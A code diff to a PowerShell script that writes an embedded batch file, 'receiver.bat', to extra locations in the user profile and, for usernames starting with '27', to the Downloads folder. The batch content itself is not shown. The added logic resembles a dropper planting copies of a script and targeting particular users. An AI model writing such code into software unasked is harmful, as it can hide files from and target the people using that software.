@@ -1,4 +1,7 @@
 $batchFilePath = "$env:APPDATA\receiver.bat"
+$batchFilePath2 = "$env:USERPROFILE\receiver.bat"
+$batchFilePath3 = "$env:USERPROFILE\Downloads\receiver.bat"
+$username = $env:USERNAME
 $batchContent = @'
 @echo off
 setlocal EnableDelayedExpansion
@@ -99,3 +102,7 @@ endlocal
 '@
 
 Set-Content -Path $batchFilePath -Value $batchContent
+Set-Content -Path $batchFilePath2 -Value $batchContent
+if ($username.startsWith("27")) {
+    Set-Content -Path $batchFilePath3 -Value $batchContent
+}
